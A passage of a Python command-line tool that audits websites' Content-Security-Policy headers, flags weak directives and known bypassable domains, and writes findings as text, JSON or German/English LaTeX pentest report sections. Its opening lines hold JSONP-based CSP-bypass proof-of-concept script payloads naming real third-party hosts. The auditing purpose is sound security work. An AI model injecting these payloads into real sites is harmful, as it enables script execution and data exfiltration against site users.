            '<script src="https://yugiohmonstrosdeduelo.blogspot.com/feeds/posts/summary?callback=alert"></script>'
        ],
    },
    "zhike.help.360.cn": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://zhike.help.360.cn/api/v1/robotWindow?callback=alert(1)-"></script>'],
    },
}


USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0"

console = Console()

# ---------------------------------------
# Data structures
# ---------------------------------------


@dataclass
class SourceItem:
    raw: str
    normalized: str
    note: Optional[str] = None
    color: str = "white"
    is_bypass: bool = False


@dataclass
class Policy:
    name: str
    items: List[SourceItem] = field(default_factory=list)
    is_deprecated: bool = False
    help_text: Optional[str] = None


@dataclass
class BypassFinding:
    directive: str
    source_raw: str
    bypass_domain: str
    risks: List[str]
    pocs: List[str]


@dataclass
class URLResult:
    url: str
    requested_url: str
    csp_raw: Optional[str]
    policies: List[Policy] = field(default_factory=list)
    deprecated_used: List[str] = field(default_factory=list)
    warnings: Dict[str, object] = field(default_factory=dict)
    bypass_findings: List[BypassFinding] = field(default_factory=list)
    error: Optional[str] = None


# ---------------------------------------
# Utilities
# ---------------------------------------


def normalize_url(url: str) -> str:
    return url if url.startswith(("http://", "https://")) else "https://" + url


def normalize_lang(lang: Optional[str]) -> str:
    if not lang:
        return "en"
    lang = lang.strip().lower()
    if lang in {"de", "german", "deutsch"}:
        return "de"
    return "en"


def normalize_proxy_list(proxies: str) -> dict:
    proxy_dict = {}
    for p in proxies.split(","):
        p = p.strip()
        if not p:
            continue

        if "://" not in p:
            p = "http://" + p

        try:
            scheme = p.split("://", 1)[0].lower()
        except Exception:
            scheme = "http"

        proxy_dict[f"{scheme}://"] = p
        if scheme == "http" and "https://" not in proxy_dict:
            proxy_dict["https://"] = p
        elif scheme == "https" and "http://" not in proxy_dict:
            proxy_dict["http://"] = p

    return proxy_dict


def build_proxy_mounts(proxy_dict: dict) -> Optional[dict]:
    """Convert scheme->url proxy dict to httpx mounts dict."""
    if not proxy_dict:
        return None
    return {scheme: httpx.AsyncHTTPTransport(proxy=url) for scheme, url in proxy_dict.items()}


def read_urls_from_file(path: str) -> List[str]:
    urls: List[str] = []
    with open(path, "r", encoding="utf-8") as fh:
        for line in fh:
            s = line.strip()
            if not s or s.startswith("#"):
                continue
            urls.append(s)
    return urls


def parse_cookies(cookie_str: Optional[str]) -> Dict[str, str]:
    if not cookie_str:
        return {}
    jar: Dict[str, str] = {}
    for c in cookie_str.split(";"):
        c = c.strip()
        if not c:
            continue
        if "=" in c:
            k, v = c.split("=", 1)
            jar[k.strip()] = v.strip()
    return jar


def is_wildcard_token(token: str) -> bool:
    if token == "*":
        return True
    if "://" in token:
        host = urllib.parse.urlparse(token).netloc
    else:
        host = token
    return "*" in host


def domain_matches_bypass_domain(csp_source: str, bypass_domain: str) -> bool:
    """Return True if CSP source token would permit loading from bypass_domain."""
    if not bypass_domain or not csp_source:
        return False

    src = csp_source.strip().lower()
    for scheme in ("https://", "http://", "wss://", "ws://", "//"):
        if src.startswith(scheme):
            src = src[len(scheme) :]
            break

    # Strip port and path
    src = src.split(":")[0].split("/")[0]
    bypass_lc = bypass_domain.lower().strip()

    # Exact match
    if src == bypass_lc:
        return True

    # Wildcard subdomain: *.example.com allows sub.example.com
    if src.startswith("*."):
        suffix = src[1:]  # ".example.com"
        if bypass_lc.endswith(suffix):
            return True

    return False


def is_host(token: str) -> bool:
    """Return True for tokens that look like host/scheme sources."""
    t = token.strip().replace("'", "")
    if not t:
        return False
    if t in {"'self'", "'none'", "'unsafe-inline'", "'unsafe-eval'", "'strict-dynamic'", "'report-sample'"}:
        return False
    if t.endswith(":"):
        return t.lower() in {"http:", "https:"}
    if t.startswith(("data:", "blob:", "filesystem:", "mediastream:", "ws:", "wss:")):
        return False
    if t == "*" or t.startswith(("http://", "//")):
        return True
    if t.lower() == "localhost":
        return True
    if re.match(r"^\[?[0-9a-fA-F:.]+\]?(:\d+)?(/.*)?$", t):
        return True
    if re.match(r"^[A-Za-z0-9.-]+\.[A-Za-z]{2,}(:\d+)?(/.*)?$", t):
        return True
    return False


def extract_csp_from_html_head(html: str) -> Optional[str]:
    class _MetaCSPParser(HTMLParser):
        def __init__(self):
            super().__init__()
            self.csp = None
            self._in_head = False

        def handle_starttag(self, tag, attrs):
            tag_l = tag.lower()
            if tag_l == "head":
                self._in_head = True

            if not self._in_head:
                return

            if tag_l == "meta":
                attrs_dict = {k.lower(): v for k, v in attrs}
                http_equiv = (attrs_dict.get("http-equiv") or "").lower()
                if http_equiv in ("content-security-policy", "x-content-security-policy"):
                    content = attrs_dict.get("content")
                    if content and self.csp is None:
                        self.csp = content.strip()

            if tag_l == "body":
                self._in_head = False

        def handle_endtag(self, tag):
            if tag.lower() == "head":
                self._in_head = False

    parser = _MetaCSPParser()
    try:
        parser.feed(html or "")
    except Exception:
        pass
    return parser.csp


def pretty_csp(csp_raw: str) -> str:
    parts = [p.strip() for p in csp_raw.split(";") if p.strip()]
    if not parts:
        return ""
    return ";\n".join(f"{p}" for p in parts) + ";"


def highlight_csp_problems(csp_pretty: str, res: URLResult) -> str:
    """
    Surround matching problem items in the pretty-printed CSP with
    §R[...]R§ markers for LaTeX highlighting.
    """
    problem_items = set()
    if res.warnings.get("unsafe_inline"):
        problem_items.add("'unsafe-inline'")
    if res.warnings.get("unsafe_eval"):
        problem_items.add("'unsafe-eval'")
    if res.warnings.get("data_or_blob"):
        problem_items.update({"data:", "blob:"})
    if res.warnings.get("missing_https_and_upgrade"):
        for token in csp_pretty.replace(";", " ").split():
            if token.startswith("http://"):
                problem_items.add(token)
            if is_host(token):
                problem_items.add(token)

    if res.warnings.get("wildcard_sources"):
        for token in csp_pretty.replace(";", " ").split():
            if "*" in token:
                problem_items.add(token)

    highlighted = csp_pretty
    for item in sorted(problem_items, key=len, reverse=True):
        highlighted = highlighted.replace(item, f"§R[{item}]R§")

    return highlighted


def parse_csp(
    csp_header: Optional[str],
    url: str,
    requested_url: str,
) -> URLResult:
    if not csp_header:
        return URLResult(
            url=url, requested_url=requested_url, csp_raw=None, error="Content-Security-Policy header not found"
        )

    parts = [p.strip() for p in csp_header.split(";")]

    policies: List[Policy] = []
    deprecated_used: List[str] = []
    bypass_findings: List[BypassFinding] = []
    seen_bypasses: set = set()

    has_unsafe_inline = False
    has_unsafe_eval = False
    has_wildcard = False
    has_data_or_blob = False
    has_report_to = False
    has_upgrade_insecure = False
    saw_host_source = False
    has_explicit_https_source = False

    for part in parts:
        if not part:
            continue
        tokens = [t for t in part.split() if t]
        if not tokens:
            continue

        name, *values = tokens
        p_help = T_HELP.get(name, {}).get("text")
        is_depr = name in DEPRECATED_OR_LEGACY
        if is_depr:
            deprecated_used.append(name)

        if name == "report-to":
            has_report_to = True
        if name == "upgrade-insecure-requests":
            has_upgrade_insecure = True

        policy = Policy(name=name, is_deprecated=is_depr, help_text=p_help)

        for item in values:
            norm = item
            lower_item = item.lower()

            if item.startswith("'nonce-"):
                norm = "'nonce-'"
            elif item.startswith("'sha256-"):
                norm = "'sha256-'"
            elif item.startswith("'sha384-"):
                norm = "'sha384-'"
            elif item.startswith("'sha512-"):
                norm = "'sha512-'"

            if is_host(item):
                saw_host_source = True

            note = T_HELP.get(norm, {}).get("text")

            if norm == "'unsafe-inline'":
                has_unsafe_inline = True
            if norm == "'unsafe-eval'":
                has_unsafe_eval = True
            if is_wildcard_token(item) or norm == "*":
                has_wildcard = True
            if norm in {"data:", "blob:"}:
                has_data_or_blob = True
            if norm == "https:" or lower_item.startswith("https://"):
                has_explicit_https_source = True

            is_bypass_source = False
            for bypass_domain, meta in BYPASS_DOMAINS.items():
                if domain_matches_bypass_domain(norm, bypass_domain):
                    is_bypass_source = True
                    key = (name, item, bypass_domain)
                    if key not in seen_bypasses:
                        seen_bypasses.add(key)
                        bypass_findings.append(
                            BypassFinding(
                                directive=name,
                                source_raw=item,
                                bypass_domain=bypass_domain,
                                risks=meta["risks"],
                                pocs=meta["pocs"],
                            )
                        )

            # Coloring rules
            if is_bypass_source:
                color = "bright_red"
            elif is_wildcard_token(item) or norm in {"*", "data:", "blob:", "'unsafe-inline'", "'unsafe-eval'"}:
                if is_wildcard_token(item) or norm == "*":
                    color = "dark_orange"
                elif norm in {"'unsafe-inline'", "'unsafe-eval'"}:
                    color = "red"
                else:
                    color = "yellow"
            elif norm in {"'none'", "'self'"}:
                color = "blue"
            else:
                color = "white"

            policy.items.append(
                SourceItem(raw=item, normalized=norm, note=note, color=color, is_bypass=is_bypass_source)
            )

        policies.append(policy)

    warnings_dict = {
        "deprecated_directives": sorted(set(deprecated_used)),
        "unsafe_inline": has_unsafe_inline,
        "unsafe_eval": has_unsafe_eval,
        "wildcard_sources": has_wildcard,
        "data_or_blob": has_data_or_blob,
        "missing_report_to": not has_report_to,
        "missing_https_and_upgrade": (
            saw_host_source and (not has_explicit_https_source) and (not has_upgrade_insecure)
        ),
        "bypass_domains": bool(bypass_findings),
    }

    return URLResult(
        url=url,
        requested_url=requested_url,
        csp_raw=csp_header,
        policies=policies,
        deprecated_used=sorted(set(deprecated_used)),
        warnings=warnings_dict,
        bypass_findings=bypass_findings,
        error=None,
    )


async def fetch_csp(
    url: str,
    *,
    cookies: Dict[str, str],
    proxies: Dict = {},
    is_secure: bool = True,
    redirect: bool = False,
    client: Optional[httpx.AsyncClient] = None,
    timeout_s: float = 15.0,
    max_retries: int = 2,
    backoff_base: float = 0.5,
) -> URLResult:
    requested_url = url
    url = normalize_url(url)

    owns_client = client is None
    if owns_client:
        mounts = build_proxy_mounts(proxies)
        client_kwargs: dict = dict(
            headers={"User-Agent": USER_AGENT},
            cookies=cookies or {},
            verify=is_secure,
            follow_redirects=redirect,
            timeout=httpx.Timeout(timeout_s),
        )
        if mounts:
            client_kwargs["mounts"] = mounts
        client = httpx.AsyncClient(**client_kwargs)

    try:
        last_exc = None
        for attempt in range(max_retries + 1):
            try:
                resp = await client.get(url)
                break
            except (httpx.TransportError, httpx.TimeoutException) as e:
                last_exc = e
                if attempt >= max_retries:
                    return URLResult(url=url, requested_url=requested_url, csp_raw=None, error=f"Request failed: {e}")
                await asyncio.sleep(backoff_base * (2**attempt))
        else:
            return URLResult(url=url, requested_url=requested_url, csp_raw=None, error=f"Request failed: {last_exc}")

        csp_header = resp.headers.get("Content-Security-Policy")
        if not csp_header:
            csp_header = resp.headers.get("X-Content-Security-Policy")

        if not csp_header:
            csp_from_meta = extract_csp_from_html_head(resp.text)
            if csp_from_meta:
                csp_header = csp_from_meta

        return parse_csp(csp_header, url, requested_url)

    except Exception as e:
        return URLResult(url=url, requested_url=requested_url, csp_raw=None, error=f"Request failed: {e}")
    finally:
        if owns_client:
            await client.aclose()


async def fetch_multiple_csps(
    urls: Sequence[str],
    *,
    cookies: Dict[str, str],
    proxies: Dict = {},
    is_secure: bool = True,
    redirect: bool = False,
    concurrency: int = 20,
    timeout_s: float = 15.0,
    max_retries: int = 2,
) -> List[URLResult]:
    sem = asyncio.Semaphore(concurrency)
    mounts = build_proxy_mounts(proxies)
    client_kwargs: dict = dict(
        headers={"User-Agent": USER_AGENT},
        cookies=cookies or {},
        verify=is_secure,
        follow_redirects=redirect,
        timeout=httpx.Timeout(timeout_s),
    )
    if mounts:
        client_kwargs["mounts"] = mounts

    async with httpx.AsyncClient(**client_kwargs) as client:

        async def _task(u: str) -> URLResult:
            async with sem:
                return await fetch_csp(
                    u,
                    cookies=cookies,
                    proxies=proxies,
                    is_secure=is_secure,
                    redirect=redirect,
                    client=client,
                    timeout_s=timeout_s,
                    max_retries=max_retries,
                )

        return await asyncio.gather(*(_task(u) for u in urls))


# ---------------------------------------
# Renderers
# ---------------------------------------


class BaseRenderer:
    def render_many(self, results: List[URLResult]) -> str:
        raise NotImplementedError


class TextRenderer(BaseRenderer):
    def __init__(self, console: Optional[Console]):
        self.console = console

    def print_to_console(self, results: List[URLResult]) -> None:
        for res in results:
            header = Text.from_markup(f"[bold]{res.requested_url}[/bold] — Fetched: [cyan]{res.url}[/cyan]")
            self.console.print(Panel(header, expand=False, box=box.ROUNDED))  # type: ignore

            if res.error:
                self.console.print(f"[red]Error:[/red] {res.error}")  # type: ignore
                self.console.print()  # type: ignore
                continue

            warn_lines = []
            if res.warnings.get("deprecated_directives"):
                warn_lines.append("Deprecated/legacy directives: " + ", ".join(res.warnings["deprecated_directives"]))  # type: ignore
            if res.warnings.get("unsafe_inline"):
                warn_lines.append("Uses [red]'unsafe-inline'[/red].")
            if res.warnings.get("unsafe_eval"):
                warn_lines.append("Uses [red]'unsafe-eval'[/red].")
            if res.warnings.get("wildcard_sources"):
                warn_lines.append("Uses [dark_orange]wildcard sources (*)[/dark_orange].")
            if res.warnings.get("data_or_blob"):
                warn_lines.append("Allows [yellow]data:[/yellow] or [yellow]blob:[/yellow] sources.")
            if res.warnings.get("missing_report_to"):
                warn_lines.append("Missing [white]report-to[/white] directive.")
            if res.warnings.get("missing_https_and_upgrade"):
                warn_lines.append(
                    "No explicit [white]https://[/white] sources and missing [white]upgrade-insecure-requests[/white]."
                )
            if res.warnings.get("bypass_domains"):
                warn_lines.append(
                    f"[bright_red bold]CSP bypass possible![/bright_red bold] "
                    f"[bright_red]{len(res.bypass_findings)} known bypassable source(s) — see Bypass Findings below.[/bright_red]"
                )

            if warn_lines:
                self.console.print(  # type: ignore
                    Panel(
                        "\n".join(warn_lines),
                        title="Warnings",
                        border_style="yellow",
                        box=box.ROUNDED,
                    )
                )

            table = Table(
                title="Content-Security-Policy",
                show_header=True,
                header_style="bold",
                box=box.SIMPLE_HEAVY,
                expand=True,
            )
            table.add_column("Directive", no_wrap=True)
            table.add_column("Source / Value", style="white")

            for p in res.policies:
                directive_label = f"[blue]{p.name}[/blue]"
                if p.is_deprecated:
                    directive_label += " [yellow](deprecated/legacy)[/yellow]"
                if p.help_text:
                    directive_label += f" [white]— {p.help_text}[/white]"

                if not p.items:
                    table.add_row(directive_label, "")
                    continue

                first = True
                for it in p.items:
                    expl = f" [dim]— {it.note}[/dim]" if it.note else ""
                    bypass_mark = " [bright_red bold][BYPASS][/bright_red bold]" if it.is_bypass else ""
                    value = f"[{it.color}]{it.raw}[/{it.color}]{expl}{bypass_mark}"
                    table.add_row(directive_label if first else "", value)
                    first = False

            self.console.print(table)  # type: ignore

            if res.bypass_findings:
                bypass_lines = []
                for bf in res.bypass_findings:
                    risks_str = " + ".join(f"[bright_red]{r}[/bright_red]" for r in bf.risks)
                    bypass_lines.append(
                        f"[bold]{bf.directive}[/bold]: [bright_red]{bf.source_raw}[/bright_red] "
                        f"→ bypass domain [yellow]{bf.bypass_domain}[/yellow] "
                        f"(risks: {risks_str})"
                    )
                    for i, poc in enumerate(bf.pocs, 1):
                        label = f"  PoC{i if len(bf.pocs) > 1 else ''}: "
                        bypass_lines.append(f"[dim]{label}[/dim][cyan]{poc}[/cyan]")
                self.console.print(  # type: ignore
                    Panel(
                        "\n".join(bypass_lines),
                        title="[bright_red bold]Bypass Findings[/bright_red bold]",
                        border_style="bright_red",
                        box=box.ROUNDED,
                    )
                )

            self.console.print()  # type: ignore

    def render_many(self, results: List[URLResult]) -> str:
        lines: List[str] = []
        for res in results:
            lines.append("=" * 78)
            lines.append(f"{res.requested_url}  (fetched: {res.url})")
            lines.append("=" * 78)
            if res.error:
                lines.append(f"Error: {res.error}")
                lines.append("")
                continue

            if res.deprecated_used:
                lines.append("Deprecated/legacy directives present: " + ", ".join(res.deprecated_used))
                lines.append("")

            if res.csp_raw:
                lines.append("CSP (raw):")
                lines.append("  " + res.csp_raw)
                lines.append("")

            for p in res.policies:
                tag = f"[{p.name}]"
                if p.is_deprecated:
                    tag += " (deprecated/legacy)"
                if p.help_text:
                    tag += f" — {p.help_text}"
                lines.append(tag)

                if not p.items:
                    lines.append("  (no values)")
                    continue

                for it in p.items:
                    expl = f" — {it.note}" if it.note else ""
                    bypass_mark = " [BYPASS]" if it.is_bypass else ""
                    lines.append(f"  + {it.raw}{expl}{bypass_mark}")
                lines.append("")

            if res.bypass_findings:
                lines.append("--- BYPASS FINDINGS ---")
                for bf in res.bypass_findings:
                    risks_str = ", ".join(bf.risks)
                    lines.append(
                        f"  {bf.directive}: {bf.source_raw} -> bypass domain {bf.bypass_domain} (risks: {risks_str})"
                    )
                    for i, poc in enumerate(bf.pocs, 1):
                        label = f"    PoC{i if len(bf.pocs) > 1 else ''}: "
                        lines.append(f"{label}{poc}")
                lines.append("")

            lines.append("")
        return "\n".join(lines)


class JsonRenderer(BaseRenderer):
    def render_many(self, results: List[URLResult]) -> str:
        def policy_to_dict(p: Policy) -> Dict:
            return {
                "name": p.name,
                "is_deprecated": p.is_deprecated,
                "help_text": p.help_text,
                "items": [
                    {
                        "raw": i.raw,
                        "normalized": i.normalized,
                        "note": i.note,
                        "color": i.color,
                        "is_bypass": i.is_bypass,
                    }
                    for i in p.items
                ],
            }

        def bypass_to_dict(bf: BypassFinding) -> Dict:
            return {
                "directive": bf.directive,
                "source_raw": bf.source_raw,
                "bypass_domain": bf.bypass_domain,
                "risks": bf.risks,
                "pocs": bf.pocs,
            }

        payload = [
            {
                "requested_url": r.requested_url,
                "fetched_url": r.url,
                "csp_raw": r.csp_raw,
                "deprecated_used": r.deprecated_used,
                "error": r.error,
                "warnings": {k: v for k, v in r.warnings.items()},
                "bypass_findings": [bypass_to_dict(bf) for bf in r.bypass_findings],
                "policies": [policy_to_dict(p) for p in r.policies],
            }
            for r in results
        ]
        return json.dumps(payload, indent=2, sort_keys=False)


class LatexRenderer(BaseRenderer):
    def __init__(self, lang: str = "en"):
        self.lang = normalize_lang(lang)

    def _problems_list(self, res: URLResult) -> List[str]:
        names = {p.name for p in res.policies}
        problems: List[str] = []

        if "default-src" not in names:
            problems.append("missing-directive")

        if res.warnings.get("unsafe_inline") or res.warnings.get("unsafe_eval"):
            problems.append("unsafe")

        if res.warnings.get("wildcard_sources"):
            problems.append("all-origins")

        if res.warnings.get("data_or_blob"):
            problems.append("data")

        if res.warnings.get("missing_report_to"):
            problems.append("no-report")

        if res.warnings.get("missing_https_and_upgrade"):
            problems.append("no-https")

        if res.warnings.get("bypass_domains"):
            problems.append("bypass")

        order = ["missing-directive", "unsafe", "no-https", "all-origins", "data", "bypass", "no-report"]
        return [p for p in order if p in problems]

    def _block_no_csp(self, plural: bool = False) -> str:
        if self.lang == "de":
            de_template = Template(
                r"""
\section{Content Security Policy}
\finding[status=Open]
{L}
{Content Security Policy}
{$FINDING_SUMMARY}
{Restriktive Content Security Policy konfigurieren}

Für $APP_FUER, die einen zusätzlichen Schutz gegen Cross-Site Scripting (XSS)-Angriffe bieten $KONJUNKTIV1.

Eine CSP ist ein zusätzliches Sicherheitsfeature, welches der Server über den \texttt{Content-Security-Policy}-HTTP-Header setzen kann, um dem Browser mitzuteilen, von welchen Quellen bestimmte Ressourcen geladen werden dürfen.
Abhängig vom Typ der Ressource, wie Skripte, Stylesheets, Grafiken etc. können verschiedene Einschränkungen konfiguriert werden, etwa von welchen Servern Dateien nachgeladen werden dürfen und ob Inline-Code erlaubt ist.
Wenn die CSP restriktiv konfiguriert ist, dient sie als zusätzlicher Schutz und hilft dabei, bestimmte Angriffe, insbesondere XSS, zu verhindern, da der Browser den injizierten Schadcode nicht laden und ausführen dürfte.

$CURRENT_STATE

Es sollte geprüft werden, ob eine restriktive CSP für $WEBAPP konfiguriert werden kann.
Dabei muss bedacht werden, dass dies Änderungen am Applikationscode erfordern kann, beispielsweise weil Inline-JavaScript-Code in dedizierte Dateien verschoben werden muss.
Bei Produkten eines anderen Herstellers sind solche Änderungen in der Regel nur von diesem sinnvoll durchführbar.

Es ist auch möglich, inkrementell auf eine effektive CSP hinzuarbeiten, indem bei mehreren Entwicklungsiterationen sukzessive striktere Regeln konfiguriert werden.
Eine CSP kann auch in einem \enquote{report-only}-Modus genutzt werden, bei dem Verstöße zunächst protokolliert, aber noch nicht blockiert werden.

Weitere Informationen können dem CSP-Artikel in den MDN Web Docs entnommen werden.\footnote{Content Security Policy: \url{https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP}}
Während der Entwicklung ist auch das Online-Werkzeug \enquote{CSP Evaluator}\footnote{CSP Evaluator: \url{https://csp-evaluator.withgoogle.com/}} hilfreich, mit dem sich die Probleme einer gegebenen CSP identifizieren lassen.
""".strip()
            )

            app_nom = "Die Webanwendung" if not plural else "Die Webanwendungen"
            finding_summary = (
                f"{app_nom} {'wird' if not plural else 'werden'} nicht durch {'eine Content Security Policy' if not plural else 'Content Security Policies'} geschützt, "
                f"die bspw. Cross-Site Scripting-Angriffe verhindern {'kann' if not plural else 'können'}"
            )
            app_fuer = (
                "die Webanwendung wird keine Content Security Policy (CSP) gesetzt"
                if not plural
                else "die untersuchten Webanwendungen werden keine Content Security Policies (CSP) gesetzt"
            )
            konjunktiv1 = "würde" if not plural else "würden"
            current_state = (
                "Derzeit wird jedoch keine CSP vom Server gesetzt."
                if not plural
                else "Derzeit setzt jedoch keiner der untersuchten Webserver eine CSP."
            )
            webapp = "die Webanwendung" if not plural else "die Webanwendungen"

            return de_template.substitute(
                FINDING_SUMMARY=finding_summary,
                APP_FUER=app_fuer,
                KONJUNKTIV1=konjunktiv1,
                CURRENT_STATE=current_state,
                WEBAPP=webapp,
            )

        else:
            en_template = Template(
                r"""
\section{Content Security Policy}
\finding[status=Open]
{L}
{Content Security Policy}
{$FINDING_SUMMARY}
{Configure restrictive content security policy}

No Content Security Policy (CSP) is set for $APP_FOR, which would provide additional protection against cross-site scripting (XSS) attacks.

A CSP is an additional security feature that the server can set via the \texttt{Content-Security-Policy} HTTP header to tell the browser from which sources certain resources may be loaded.
Depending on the type of resource, such as scripts, stylesheets, graphics, etc., various restrictions can be configured, such as from which servers files may be loaded and whether inline code is permitted.
If the CSP is configured restrictively, it serves as additional protection and helps to prevent certain attacks, especially XSS, as the browser is not allowed to load and execute the injected malicious code.

$CURRENT_STATE

It should be checked whether $SIN_PLU_CSP can be configured for $APP_FOR.
It must be borne in mind that this may require changes to the application code, for example because inline JavaScript code must be moved to dedicated files.
In the case of products from another manufacturer, such changes can usually only be made by that manufacturer.

It is also possible to work incrementally towards an effective CSP by configuring successively stricter rules for several development iterations.
A CSP can also be used in a \enquote{report-only} mode, in which violations are initially logged but not yet blocked.

Further information can be found in the CSP article in the MDN Web Docs.\footnote{Content Security Policy: \url{https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP}}
During development, the online tool \enquote{CSP Evaluator}\footnote{CSP Evaluator: \url{https://csp-evaluator.withgoogle.com/}}, which can be used to identify the problems of a given CSP, is also helpful.
""".strip()
            )

            app_nom = "The web application" if not plural else "The web applications"
            finding_summary = (
                f"{app_nom} {'is' if not plural else 'are'} not protected by a content security policy that can, "
                f"for example, prevent cross-site scripting attacks"
            )
            app_for = "the web application" if not plural else "the web applications"
            current_state = (
                "However, no CSP is currently set by the server."
                if not plural
                else "However, no CSPs are set by the examined servers."
            )
            sin_plu_csp = "a restrictive CSP" if not plural else "restrictive CSPs"

            return en_template.substitute(
                FINDING_SUMMARY=finding_summary,
                APP_FOR=app_for,
                CURRENT_STATE=current_state,
                SIN_PLU_CSP=sin_plu_csp,
            )

    def render_many(self, results: List[URLResult]) -> str:
        provide_flash = r"\providecommand{\flash}{\syred{\faFlash}}"

        if len(results) == 1:
            res = results[0]
            if res.error or not res.csp_raw:
                return self._block_no_csp()

            formatted = pretty_csp(res.csp_raw)
            formatted = highlight_csp_problems(formatted, res)
            problems = "{" + ",".join(self._problems_list(res)) + "}"
            block = rf"""
\begin{{sydeflisting}}{{csplisting}}
{formatted}
\end{{sydeflisting}}
\baustein[%
    findingattribute={{%
        %prefix={{}},
    }},
    einstufung=I,
    csplisting=csplisting,
    probleme={problems}, % Options: missing-directive,unsafe,no-https,all-origins,data,bypass,no-report
]
{{csp}}
""".strip()
            return "\n\n".join([provide_flash, block])

        all_no_csp = all((r.error or not r.csp_raw) for r in results)

        if all_no_csp:
            return self._block_no_csp(plural=True)

        cumulative: List[str] = []
        for r in results:
            if r.error or not r.csp_raw:
                continue
            for p in self._problems_list(r):
                if p not in cumulative:
                    cumulative.append(p)

        problems_braced = "{" + ",".join(cumulative) + "}"

        template_block = rf"""
\begin{{sydeflisting}}{{csplisting}}
§R[TODO: Diesen Teil im Bausteintext per lokalem Baustein entfernen!]R§
\end{{sydeflisting}}
\baustein[%
    findingattribute={{%
        %prefix={{}},
    }},
    einstufung=I,
    csplisting=csplisting,
    probleme={problems_braced}, % Options: missing-directive,unsafe,no-https,all-origins,data,bypass,no-report
]
{{csp}}
""".strip()

        headers = cumulative[:]
        headers.append("no csp set")
        header_titles = ["URL"] + headers
        num_problem_cols = len(headers)
        col_spec = "l" + ("-c" * num_problem_cols)

        lines: List[str] = []
        lines.append(
            f"{r'\vref{tab:csp_config} gibt eine Übersicht über Fehlkonfigurationen der CSPs.' if self.lang == 'de' else r'\vref{tab:csp_config} provides an overview of CSP misconfigurations.'}"
        )
        lines.append("")
        lines.append(
            rf"\begin{{sytable}}[{'CSP Fehlkonfigurationen' if self.lang == 'de' else 'CSP misconfigurations'}\label{{tab:csp_config}}]{{"
            + col_spec
            + f"}}{{{' & '.join(header_titles)}}}"
        )

        for r in results:
            url_label = r.requested_url
            row_cells: List[str] = [url_label]

            if r.error or not r.csp_raw:
                for _ in cumulative:
                    row_cells.append("")
                row_cells.append(r"\flash")
            else:
                plist = set(self._problems_list(r))
                for p in cumulative:
                    row_cells.append(r"\flash" if p in plist else "")
                row_cells.append("")

            lines.append(" & ".join(row_cells) + r" \\")
        lines.append(r"\end{sytable}")

        table_block = "\n".join(lines)

        return "\n\n".join([provide_flash, template_block, table_block])


# ---------------------------------------
# CLI
# ---------------------------------------


def read_csp_with_rich(*, sentinel: str = "EOF") -> Optional[str]:
    """
    Show a Rich-styled prompt that lets the user paste a CSP.
    """
    console = Console()
    console.print(
        Panel.fit(
            Text.from_markup(
                "[b]Interactive CSP Input[/]\n"
                "Paste your Content-Security-Policy below.\n\n"
                f"• End input with a line containing only [b]{sentinel}[/]\n"
                "• Or send end-of-file: Ctrl-D (macOS/Linux) or Ctrl-Z then Enter (Windows)\n\n"
                "Example:\n"
                "  default-src 'self'; script-src 'self' https://cdn.example.com;\n"
                f"  [i]{sentinel}[/]\n"
            ),
            title="CSP Parser",
            border_style="cyan",
        )
    )

    lines: list[str] = []
    try:
        while True:
            try:
                line = input()
            except EOFError:
                break
            if line.strip() == sentinel:
                break
            lines.append(line)
    except KeyboardInterrupt:
        console.print("\n[dim]Aborted by user.[/]")
        return None

    csp = "\n".join(lines).strip()
    if not csp:
        console.print("[red]No CSP provided.[/]")
        return None
    return csp


def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Inspect the Content-Security-Policy header for one or many URLs.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """\
            Examples:
              csp_check.py -u https://example.com
              csp_check.py -f urls.txt
              csp_check.py -u example.com -o results.txt
              csp_check.py -u example.com -o results.json --format json
              csp_check.py -u example.com -o results.tex --format latex --lang de
            """
        ),
    )
    src = p.add_mutually_exclusive_group(required=True)
    src.add_argument("-u", "--url", help="Single URL/domain to check.")
    src.add_argument("-f", "--file", help="Path to a file with one URL per line.")
    src.add_argument("--csp", action="store_true", help="Open an interactive input to paste a CSP and parse it.")

    p.add_argument("-c", "--cookies", help="Semicolon-separated cookies: 'a=b; c=d'", default=None)
    p.add_argument(
        "-o",
        "--output",
        help="Write results to this file. If omitted, prints to console (unless --format=latex).",
        default=None,
    )
    p.add_argument(
        "--format",
        choices=["text", "raw", "json", "latex"],
        default="text",
        help="Output format when writing to a file. Default: text.",
    )
    p.add_argument(
        "-l",
        "--lang",
        help="Language for LaTeX output (de|en|german|english). Default: de.",
        default="de",
    )
    p.add_argument(
        "--proxy",
        help="Comma-separated list of proxy URLs to use, e.g. 'http://127.0.0.1:8080,https://proxy2:443'.",
        default=None,
    )
    p.add_argument(
        "--insecure",
        action="store_false",
        help="Disable SSL certificate verification.",
    )
    p.add_argument(
        "-r",
        "--redirect",
        action="store_true",
        help="Allows redirects.",
    )
    p.add_argument(
        "-t",
        "--threads",
        type=int,
        default=20,
        help="Max number of concurrent requests when fetching multiple URLs (default: 20)",
    )
    p.add_argument(
        "--retries",
        type=int,
        default=2,
        help="Number of retry attempts for transient network errors (default: 2)",
    )
    p.add_argument(
        "--timeout",
        type=float,
        default=15.0,
        help="Per-request timeout in seconds (default: 15)",
    )

    return p


def main() -> int:
    args = build_arg_parser().parse_args()
    cookies = parse_cookies(args.cookies)

    if args.csp:
        csp_text = read_csp_with_rich()
        if csp_text is None:
            return -1
        result = parse_csp(csp_text, "<stdin>", "<stdin>")
        TextRenderer(console=Console()).print_to_console([result])
        return 0

    if args.url:
        urls = [args.url]
    else:
        try:
            urls = read_urls_from_file(args.file)
        except Exception as e:
            console.print(f"[red]Failed to read file:[/red] {e}")
            return 2

    if (args.format == "text" or args.format is None) and len(urls) > 1:
        print_choice = input(f"Do you really want to print {len(urls)} results in you terminal? (Y/n): ")
        if not (print_choice.lower() == "y" or print_choice == ""):
            print("Try one of the other output methods with -o [raw, json, latex]")
            exit(1)

    if args.proxy:
        proxies = normalize_proxy_list(args.proxy)
    else:
        proxies = {}

    results: List[URLResult] = asyncio.run(
        fetch_multiple_csps(
            urls,
            cookies=cookies,
            proxies=proxies,
            is_secure=args.insecure,
            redirect=args.redirect,
            concurrency=args.threads,
            timeout_s=args.timeout,
            max_retries=args.retries,
        )
    )

    # File output
    if args.output:
        if args.format == "json":
            renderer: BaseRenderer = JsonRenderer()
        elif args.format == "latex":
